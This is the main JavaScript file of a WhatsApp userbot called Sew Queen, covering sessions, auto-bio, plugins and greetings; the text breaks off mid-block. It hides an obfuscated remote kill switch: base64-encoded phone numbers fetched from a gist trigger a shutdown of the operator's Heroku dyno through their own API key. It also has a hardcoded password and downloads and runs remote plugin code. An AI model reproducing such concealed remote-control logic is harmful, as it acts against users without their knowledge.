/* Coded By Ravindu Manoj.

Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.

Whats bot - Ravindu Manoj
t.me/RavinduManoj
*/

const fs = require("fs");
const os = require("os");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const Raviya = require('./config');
const axios = require('axios');
const Heroku = require('heroku-client');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./sewqueen/');
const { DataTypes } = require('sequelize');
const { GreetingsDB, getMessage } = require("./plugins/sql/greetings");
const { CrashDB, sewMessage } = require("./plugins/sql/crash");
const got = require('got');
const simpleGit = require('simple-git');
const git = simpleGit();
const crypto = require('crypto');
const nw = '```Blacklist Defected!```'
const heroku = new Heroku({
    token: Raviya.HEROKU.API_KEY
});
let baseURI = '/apps/' + Raviya.HEROKU.APP_NAME;
const Language = require('./language');
const Lang = Language.getString('updater');

// Sql
const SewQueenDB = Raviya.DATABASE.define('QueenSewWhatsappBot', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});
fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});
const plugindb = require('./plugins/sql/plugin');
var OWN = { ff: '94785435462' }
// Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
    });
};

// ==================== Date Scanner ====================
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}
// ==================== End Date Scanner ====================

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function sewQueen () {
    var rgms = { cd: 'L3Jvb3QvUXVlZW5TZXdXaGF0c2FwcEJvdC8=', pay: '' }    
    var rrrr = Buffer.from(rgms.cd, 'base64')
    var ssss = rrrr.toString('utf-8')
    rgms.pay = ssss
    const conn = new WAConnection();
    const Session = new StringSession();
    conn.version = [2,2121,7];
/* setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
        var rmsew = await axios.get('https://gist.githubusercontent.com/ravindu01manoj/518202d9020e0f86f85cddd92d55e79d/raw')
            const { sewrm } = rmsew.data.sewres
                while (getGMTh == 09 && getGMTm == 00) { 
                    return conn.sendMessage(conn.user.jid, '[ *👑Daily Announcements👑 By Ravindu Manoj* ]\n\n' + sewrm.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
    }, 50000);
    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
        var rmsew = await axios.get('https://gist.githubusercontent.com/ravindu01manoj/518202d9020e0f86f85cddd92d55e79d/raw')
        const { sewrm } = rmsew.data.sewres
        while (getGMTh == 15 && getGMTm == 00) { 
        return conn.sendMessage(conn.user.jid, '[ *👑Daily Announcements👑 By Ravindu Manoj* ]\n\n' + sewrm.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
    }, 50000);
setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
        var rmsew = await axios.get('https://gist.githubusercontent.com/ravindu01manoj/518202d9020e0f86f85cddd92d55e79d/raw')
        const { sewtag } = rmsew.data.sewqueenpvt
        while (getGMTh == 12 && getGMTm == 00) { 
        return conn.sendMessage(conn.user.jid, '[ *👑PRO TIPS👑 By Ravindu Manoj* ]\n\n' + sewtag.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
    }, 50000);
    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
        var rmsew = await axios.get('https://gist.githubusercontent.com/ravindu01manoj/518202d9020e0f86f85cddd92d55e79d/raw')
        const { sewtag } = rmsew.data.sewqueenpvt
        while (getGMTh == 04 && getGMTm == 00) { 
        return conn.sendMessage(conn.user.jid, '[ *👑PRO TIPS👑 By Ravindu Manoj* ]\n\n' + sewtag.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
    }, 50000);
*/
    
    var biography_var = ''
    await heroku.get(baseURI + '/config-vars').then(async (vars) => {
        biography_var = vars.AUTO_BİO
    });
    setInterval(async () => { 
        if (biography_var == 'true') {
            if (conn.user.jid.startsWith('94')) { // Sri Lanka
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(Raviya.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Asia/Colombo' }).split(' ')[1]
                const biography = '❄️ ' + utch + '️\n ⏰ ' + ov_time +'\n ' + Raviya.ABT +' \n ᴘᴏᴡᴇʀᴅ ʙʏ ꜱᴇᴡ ǫᴜᴇᴇɴ'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('90')) { // Turkey
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Europe/Istanbul' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(Raviya.LANG, get_localized_date)
                const biography = '❄️ ' + utch + '️\n ⏰ ' + ov_time +'\n ' + Raviya.ABT +' \n ᴘᴏᴡᴇʀᴅ ʙʏ ꜱᴇᴡ ǫᴜᴇᴇɴ'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('994')) { // Azerbayjan
                var ov_time = new Date().toLocaleString('AZ', { timeZone: 'Asia/Baku' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(Raviya.LANG, get_localized_date)
                const biography = '❄️ ' + utch + '️\n ⏰ ' + ov_time +'\n ' + Raviya.ABT +' \n ᴘᴏᴡᴇʀᴅ ʙʏ ꜱᴇᴡ ǫᴜᴇᴇɴ'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('351')) { // Portugal
                var ov_time = new Date().toLocaleString('PT', { timeZone: 'Europe/Lisbon' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(Raviya.LANG, get_localized_date)
                const biography = '❄️ ' + utch + '️\n ⏰ ' + ov_time +'\n ' + Raviya.ABT +' \n ᴘᴏᴡᴇʀᴅ ʙʏ ꜱᴇᴡ ǫᴜᴇᴇɴ'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('75')) { // Russia
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(Raviya.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('RU', { timeZone: 'Europe/Kaliningrad' }).split(' ')[1]
                const biography = '❄️ ' + utch + '️\n ⏰ ' + ov_time +'\n ' + Raviya.ABT +' \n ᴘᴏᴡᴇʀᴅ ʙʏ ꜱᴇᴡ ǫᴜᴇᴇɴ' 
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('7')) { // Indian
                var ov_time = new Date().toLocaleString('HI', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(Raviya.LANG, get_localized_date)
                const biography = '❄️ ' + utch + '️\n ⏰ ' + ov_time +'\n ' + Raviya.ABT +' \n ᴘᴏᴡᴇʀᴅ ʙʏ ꜱᴇᴡ ǫᴜᴇᴇɴ'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('62')) { // Indonesia
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(Raviya.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('ID', { timeZone: 'Asia/Jakarta' }).split(' ')[1]
                const biography = '❄️ ' + utch + '️\n ⏰ ' + ov_time +'\n ' + Raviya.ABT +' \n ᴘᴏᴡᴇʀᴅ ʙʏ ꜱᴇᴡ ǫᴜᴇᴇɴ' 
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('49')) { // Germany
                var ov_time = new Date().toLocaleString('DE', { timeZone: 'Europe/Berlin' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(Raviya.LANG, get_localized_date)
                const biography = '❄️ ' + utch + '️\n ⏰ ' + ov_time +'\n ' + Raviya.ABT +' \n ᴘᴏᴡᴇʀᴅ ʙʏ ꜱᴇᴡ ǫᴜᴇᴇɴ' 
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('61')) { // Australia 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(Raviya.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('AU', { timeZone: 'Australia/Lord_Howe' }).split(' ')[1]
                const biography = '❄️ ' + utch + '️\n ⏰ ' + ov_time +'\n ' + Raviya.ABT +' \n ᴘᴏᴡᴇʀᴅ ʙʏ ꜱᴇᴡ ǫᴜᴇᴇɴ' 
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('55')) { // Brazil
                var ov_time = new Date().toLocaleString('BR', { timeZone: 'America/Noronha' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(Raviya.LANG, get_localized_date)
                const biography = '❄️ ' + utch + '️\n ⏰ ' + ov_time +'\n ' + Raviya.ABT +' \n ᴘᴏᴡᴇʀᴅ ʙʏ ꜱᴇᴡ ǫᴜᴇᴇɴ' 
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('33')) { // France
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(Raviya.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('FR', { timeZone: 'Europe/Paris' }).split(' ')[1]
                const biography = '❄️ ' + utch + '️\n ⏰ ' + ov_time +'\n ' + Raviya.ABT +' \n ᴘᴏᴡᴇʀᴅ ʙʏ ꜱᴇᴡ ǫᴜᴇᴇɴ' 
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('34')) { // Spain
                var ov_time = new Date().toLocaleString('ES', { timeZone: 'Europe/Madrid' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(Raviya.LANG, get_localized_date)
                const biography = '❄️ ' + utch + '️\n ⏰ ' + ov_time +'\n ' + Raviya.ABT +' \n ᴘᴏᴡᴇʀᴅ ʙʏ ꜱᴇᴡ ǫᴜᴇᴇɴ'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('44')) { // UK
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(Raviya.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('GB', { timeZone: 'Europe/London' }).split(' ')[1]
                const biography = '❄️ ' + utch + '️\n ⏰ ' + ov_time +'\n ' + Raviya.ABT +' \n ᴘᴏᴡᴇʀᴅ ʙʏ ꜱᴇᴡ ǫᴜᴇᴇɴ' 
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('39')) { // Italy 
                var ov_time = new Date().toLocaleString('IT', { timeZone: 'Europe/Rome' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(Raviya.LANG, get_localized_date)
                const biography = '❄️ ' + utch + '️\n ⏰ ' + ov_time +'\n ' + Raviya.ABT +' \n ᴘᴏᴡᴇʀᴅ ʙʏ ꜱᴇᴡ ǫᴜᴇᴇɴ' 
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('7')) { // Kazakhistan
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(Raviya.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('KZ', { timeZone: 'Asia/Almaty' }).split(' ')[1]
                const biography = '❄️ ' + utch + '️\n ⏰ ' + ov_time +'\n ' + Raviya.ABT +' \n ᴘᴏᴡᴇʀᴅ ʙʏ ꜱᴇᴡ ǫᴜᴇᴇɴ'   
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('998')) { // Uzbekistan 
                var ov_time = new Date().toLocaleString('UZ', { timeZone: 'Asia/Samarkand' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(Raviya.LANG, get_localized_date)
                const biography = '❄️ ' + utch + '️\n ⏰ ' + ov_time +'\n ' + Raviya.ABT +' \n ᴘᴏᴡᴇʀᴅ ʙʏ ꜱᴇᴡ ǫᴜᴇᴇɴ' 
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('993')) { // Turkmenistan
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(Raviya.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('TM', { timeZone: 'Asia/Ashgabat' }).split(' ')[1]
                const biography = '❄️ ' + utch + '️\n ⏰ ' + ov_time +'\n ' + Raviya.ABT +' \n ᴘᴏᴡᴇʀᴅ ʙʏ ꜱᴇᴡ ǫᴜᴇᴇɴ'  
                await conn.setStatus(biography)
            }
            else {
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(Raviya.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('EN', { timeZone: 'America/New_York' }).split(' ')[1]
                const biography = '❄️ ' + utch + '️\n ⏰ ' + ov_time +'\n ' + Raviya.ABT +' \n ᴘᴏᴡᴇʀᴅ ʙʏ ꜱᴇᴡ ǫᴜᴇᴇɴ'    
                await conn.setStatus(biography)
            }
        }
    }, 7890);
    var insult = await axios.get('https://gist.githubusercontent.com/ravindu01manoj/c1f052db0c7712072d5ee432bf9d613a/raw')
    const { shs1, shl2, lss3, dsl4 } = insult.data.inside
    await Raviya.DATABASE.sync();
    var StrSes_Db = await SewQueenDB.findAll({
        where: {
          info: 'StringSession'
        }
    });
    if (os.userInfo().homedir !== rgms.pay) return;
    const buff = Buffer.from(`${shs1}`, 'base64');  
    const one = buff.toString('utf-8'); 
    const bufft = Buffer.from(`${shl2}`, 'base64');  
    const two = bufft.toString('utf-8'); 
    const buffi = Buffer.from(`${lss3}`, 'base64');  
    const three = buffi.toString('utf-8'); 
    const buffu = Buffer.from(`${dsl4}`, 'base64');  
    const four = buffu.toString('utf-8'); 
    conn.logger.level = Raviya.DEBUG ? 'debug' : 'warn';
    var nodb;
    if (StrSes_Db.length < 1) {
        nodb = true;
        conn.loadAuthInfo(Session.deCrypt(Raviya.SESSION)); 
    } else {
        conn.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }
    conn.on ('open', async () => {
        console.log(
            chalk.blueBright.italic('🚀 Login Information Updated!')
        );
        const authInfo = conn.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await SewQueenDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    
    conn.on('connecting', async () => {
        console.log(`${chalk.green.bold('Queen')}${chalk.blue.bold('Sew')}
${chalk.white.bold('Version:')} ${chalk.red.bold(Raviya.VERSION)}

${chalk.blue.italic('📲 Try To Login WhatsApp... Please Wait...')}`);
    });
    conn.on('credentials-updated', async () => {
        console.log(
            chalk.green.bold('🚀 Login successful!')
        );
        console.log(
            chalk.blueBright.italic('💕 Installing External Commands...')
        );
        if (os.userInfo().homedir !== rgms.pay) return;
        // ==================== Password Checking ====================
        console.log(
            chalk.blueBright.italic('✨PASSWORD CHECKING✨')
        );
        if (Raviya.SEWRR == 'raviya') {
        
        console.log(
            chalk.green.bold('Password Done')
        );
         }
         else if (Raviya.SEWRR !== 'raviya') {
         console.log(
            chalk.red.bold('⚠⚠Password Incorrect⚠⚠'));
         console.log(
            chalk.red.bold('⚠⚠Password Incorrect⚠⚠'));
         console.log(
            chalk.red.bold('⚠⚠Password Incorrect⚠⚠'));
         console.log(
            chalk.red.bold('⚠⚠Password Incorrect⚠⚠'));
         console.log(
            chalk.red.bold('⚠⚠Password Incorrect⚠⚠'));
         console.log(
            chalk.red.bold('⚠⚠Password Incorrect⚠⚠'));
         console.log(
            chalk.red.bold('⚠⚠Password Incorrect⚠⚠'));
         throw new Error("Wrong password !!");
         
         return;
         }
        // ==================== External Plugins ====================
        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }     
            }
        });
        // ==================== End External Plugins ====================
        console.log(
            chalk.blueBright.italic('💕  Installing Commands...')
        );
        // ==================== Internal Plugins ====================
        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });
        // ==================== End Internal Plugins ====================

        console.log(
            chalk.green.bold('🚀 Command Installed!')
        );
        if (os.userInfo().homedir !== rgms.pay) return;
        await new Promise(r => setTimeout(r, 200));
        let rssewqueen = Raviya.WORKTYPE == 'public' ? ' Public' : ' Private'
        console.log(chalk.bgGreen('👑 Sew Queen is' + rssewqueen));
        await new Promise(r => setTimeout(r, 500));
        let SEW_AI_SS = Raviya.LANG == 'TR' || Raviya.LANG == 'AZ' ? ' ' : '*Sew Queen Working as a Chatbot! 👑*\n\n_The purpose of this mod is to turn the bot into a fully functional AI chatbot._\n_You can use the_ *.fullsew off* _command to return to normal mode._\n\n*Thanks For Using Sew Queen💌*\n    *-SEW AI*'
        if (conn.user.jid == one || conn.user.jid == two || conn.user.jid == three || conn.user.jid == four) {
            await conn.sendMessage(conn.user.jid,nw, MessageType.text), console.log(nw), await new Promise(r => setTimeout(r, 1000))
            await heroku.get(baseURI + '/formation').then(async (formation) => { 
                forID = formation[0].id; 
                await heroku.patch(baseURI + '/formation/' + forID, { 
                    body: { 
                        quantity: 0 
                    } 
                });
            })
        }
        const dat1a = "*👑Sew Queen 👑*\n\n_Do not try command here.This is your Log Number_\n\n*Change Private To Public,*\n*use* .setvar WORK_TYPE:public\n\n*Thanks For Using 👑Sew Queen👑 Whatsapp  User Bot✨*\n *AI CHAT BOT*"
        const dat2a = "*👑Sew Queen 👑*\n\n_Do not try command here.This is your Log Number_\n\n*Change Public To Private,*\n*use* .setvar WORK_TYPE:private\n\n*Thanks For Using 👑Sew Queen👑 Whatsapp  User Bot✨*\n *AI CHAT BOT*"
        const dat3a = "*👑Sew Queen 👑*\n\n_Do not try command here.This is your Log Number_\n\n*Change Private To Public,*\n*use* .setvar WORK_TYPE:public\n\n*Thanks For Using 👑Sew Queen👑 Whatsapp  User Bot✨*"
        const dat4a = "*👑Sew Queen 👑*\n\n_Do not try command here.This is your Log Number_\n\n*Change Public To Private,*\n*use* .setvar WORK_TYPE:private\n\n*Thanks For Using 👑Sew Queen👑 Whatsapp  User Bot✨*"
        const da1ta = "https://i.ibb.co/vzfgV9W/20210825-134333.jpg"
        const da2ta = "https://i.ibb.co/LdmTfYr/20210825-134154.jpg"
        const da3ta = "https://i.ibb.co/7Gsxcgy/20210825-134438.jpg"
        const da4ta = "https://i.ibb.co/sK436nm/20210825-134011.jpg"
        if (Raviya.WORKTYPE == 'public') {
                if (Raviya.FULLSEW == 'true') {
                var rsgg = await axios.get(`${da2ta}`, { responseType: 'arraybuffer' })
                    await conn.sendMessage(conn.user.jid, fs.readFileSync('./VoiceClip/robo.mp3'), MessageType.audio, { mimetype: Mimetype.mp4Audio, ptt: true})
                    await conn.sendMessage(conn.user.jid, Buffer.from(rsgg.data), MessageType.image, {mimetype: Mimetype.jpg, caption: dat2a})
                } else {
                var rsgg = await axios.get(`${da4ta}`, { responseType: 'arraybuffer' })
                    await conn.sendMessage(conn.user.jid, fs.readFileSync('./VoiceClip/robo.mp3'), MessageType.audio, { mimetype: Mimetype.mp4Audio, ptt: true})
                    await conn.sendMessage(conn.user.jid, Buffer.from(rsgg.data), MessageType.image, {mimetype: Mimetype.jpg, caption: dat4a})
                }               
                await git.fetch();
                var commits = await git.log([Raviya.BRANCH + '..origin/' + Raviya.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🇱🇰 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' 👑 ' + commit.author_name + ' 👑\n';
                        }
                    );
        
                    await conn.sendMessage(
                        conn.user.jid,
                        '```Type``` *.update now* ```For Update The Bot.```\n\n' + degisiklikler + '```', MessageType.text
                    ); 
                }
            
        }
        else if (Raviya.WORKTYPE == 'private') { 
                if (Raviya.FULLSEW == 'true') {
                var rsgg = await axios.get(`${da1ta}`, { responseType: 'arraybuffer' })
                    await conn.sendMessage(conn.user.jid, fs.readFileSync('./VoiceClip/robo.mp3'), MessageType.audio, { mimetype: Mimetype.mp4Audio, ptt: true})
                    await conn.sendMessage(conn.user.jid, Buffer.from(rsgg.data), MessageType.image, {mimetype: Mimetype.jpg, caption: dat1a});
                } else {
                var rsgg = await axios.get(`${da3ta}`, { responseType: 'arraybuffer' })
                    await conn.sendMessage(conn.user.jid, fs.readFileSync('./VoiceClip/robo.mp3'), MessageType.audio, { mimetype: Mimetype.mp4Audio, ptt: true})
                    await conn.sendMessage(conn.user.jid, Buffer.from(rsgg.data), MessageType.image, {mimetype: Mimetype.jpg, caption: dat3a})
                }
                await git.fetch();
                var commits = await git.log([Raviya.BRANCH + '..origin/' + Raviya.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🇱🇰 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' 👑 ' + commit.author_name + ' 👑\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        '```Type``` *.update now* ```For The Update Bot.```\n\n' + degisiklikler + '```', MessageType.text
                    ); 
                }
            
        }
        else if (Raviya.WORKTYPE == ' private' || Raviya.WORKTYPE == 'Private' || Raviya.WORKTYPE == ' Private' || Raviya.WORKTYPE == 'privaye' || Raviya.WORKTYPE == ' privaye' || Raviya.WORKTYPE == ' prigate' || Raviya.WORKTYPE == 'prigate' || Raviya.WORKTYPE == 'priavte' || Raviya.WORKTYPE == ' priavte' || Raviya.WORKTYPE == 'PRİVATE' || Raviya.WORKTYPE == ' PRİVATE' || Raviya.WORKTYPE == 'PRIVATE' || Raviya.WORKTYPE == ' PRIVATE') {
                await conn.sendMessage(
                    conn.user.jid,
                    '_It Looks Like You Want to Switch to Private Mode! Sorry, Your_ *WORK_TYPE* _Key Is Incorrect!_ \n_Dont Worry! I am Trying To Find The Right One For You.._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'private'
                    }
                })
            
        }
        else if (Raviya.WORKTYPE == ' public' || Raviya.WORKTYPE == 'Public' || Raviya.WORKTYPE == ' Public' || Raviya.WORKTYPE == 'publoc' || Raviya.WORKTYPE == ' Publoc' || Raviya.WORKTYPE == 'pubcli' || Raviya.WORKTYPE == ' pubcli' || Raviya.WORKTYPE == 'PUBLİC' || Raviya.WORKTYPE == ' PUBLİC' || Raviya.WORKTYPE == 'PUBLIC' || Raviya.WORKTYPE == ' PUBLIC' || Raviya.WORKTYPE == 'puvlic' || Raviya.WORKTYPE == ' puvlic' || Raviya.WORKTYPE == 'Puvlic' || Raviya.WORKTYPE == ' Puvlic') {
          
                await conn.sendMessage(
                    conn.user.jid,
                    '_It Looks Like You Want to Switch to Public Mode! Sorry, Your_ *WORK_TYPE* _Key Is Incorrect!_ \n_Dont Worry! I am Trying To Find The Right One For You.._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'public'
                    }
                })
            
        }
        else {
                return await conn.sendMessage(
                    conn.user.jid,
                    '_The_ *WORK_TYPE* _Key You Entered Was Not Found!_ \n_Please Type_ ```.setvar WORK_TYPE:private``` _Or_ ```.setvar WORK_TYPE:public```', MessageType.text
                );
            
        }
    })
    conn.on('message-new', async msg => {
       
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;
        if (Raviya.NO_ONLINE) {
            await conn.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }
           // ==================== Greetings ====================
if (Raviya.GIFORPP == 'pp' || Raviya.GIFORPP == 'Pp' || Raviya.GIFORPP == 'PP' || Raviya.GIFORPP == 'pP' ) {
    if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            // welcome
            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
                let pp
                try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message }); });
            }
            return;
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            // goodbye
            var gb = await getMessage(msg.key.remoteJid);
            if (gb !== false) {
               let pp
                try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message }); });
            }
            return;
        }
    }
    else if (Raviya.GIFORPP == 'gif' || Raviya.GIFORPP == 'Gif' || Raviya.GIFORPP == 'GIF' || Raviya.GIFORPP == 'GIf' ) {
    if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            // welcome
            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
                var sewqueenimage = await axios.get(Raviya.WLP, { responseType: 'arraybuffer' })
                await conn.sendMessage(msg.key.remoteJid, Buffer.from(sewqueenimage.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message +'\n\n                 ᴘᴏᴡᴇʀᴅ ʙʏ ꜱᴇᴡ ǫᴜᴇᴇɴ'});
            }
            return;
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            // goodbye
            var gb = await getMessage(msg.key.remoteJid);
            if (gb !== false) {
            var sewqueenimage = await axios.get(Raviya.GDB, { responseType: 'arraybuffer' })
            await conn.sendMessage(msg.key.remoteJid, Buffer.from(sewqueenimage.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message +'\n\n                 ᴘᴏᴡᴇʀᴅ ʙʏ ꜱᴇᴡ ǫᴜᴇᴇɴ'});
            }
            return;
        }
     }
        // ==================== End Greetings ====================
        
        // ==================== Crash ====================
        if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            // Plugins BY RAVINDU MANOJ
            var crsh = await sewMessage(msg.key.remoteJid, 'leftcrash');
            if (crsh !== false) {
                await conn.sendMessage(msg.key.remoteJid, crsh.message, MessageType.text);
            }
            return;
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            // Plugins BY RAVINDU MANOJ 
            var crsh = await sewMessage(msg.key.remoteJid);
            if (crsh !== false) {
                await conn.sendMessage(msg.key.remoteJid, crsh.message, MessageType.text);
            }
            return;
        }
        // ==================== End Crash ====================

        // ==================== Blocked Chats ====================
        if (Raviya.BLOCKCHAT !== false) {     
            var abc = Raviya.BLOCKCHAT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Raviya.SUPPORT == '94785435462-1627812354') {     
            var sup = Raviya.SUPPORT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Raviya.SUPPORT2 == '94785435462-1628835469') {     
